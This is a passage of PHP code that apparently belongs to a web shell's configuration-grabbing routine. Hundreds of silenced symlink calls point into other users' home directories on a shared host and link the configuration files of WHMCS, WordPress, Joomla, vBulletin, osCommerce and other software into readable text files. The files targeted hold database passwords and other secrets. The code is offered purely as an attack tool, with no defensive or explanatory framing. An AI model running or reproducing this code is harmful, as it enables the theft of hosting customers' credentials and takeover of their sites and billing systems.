@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');

//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home2/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
